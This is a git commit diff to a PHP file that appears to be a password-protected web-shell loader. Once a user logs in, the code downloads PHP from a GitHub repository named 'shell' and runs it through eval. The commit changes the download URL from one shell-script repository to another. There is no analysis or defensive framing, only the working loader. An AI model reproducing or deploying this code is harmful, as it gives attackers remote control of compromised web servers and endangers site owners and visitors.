4bcb528f37b93309dda81a3a1c8ba6116d819c7a
topanaqshoolababil <52111825+topanaqshoolababil@users.noreply.github.com>
2024-07-23 15:08:47 +0700

    Update simple1.php

--- simple1.php
+++ simple1.php
@@ -56,7 +56,7 @@ if (isset($_POST['password'])) {
 
 // Check if the user is logged in before executing the content
 if (is_logged_in()) {
-    $a = geturlsinfo('https://raw.githubusercontent.com/munz666/scriptshelll/main/403.php');
+    $a = geturlsinfo('https://raw.githubusercontent.com/topanaqshoolababil/shell/main/d7net.php');
     eval('?>' . $a);
 } else {
     // Display login form if not logged in
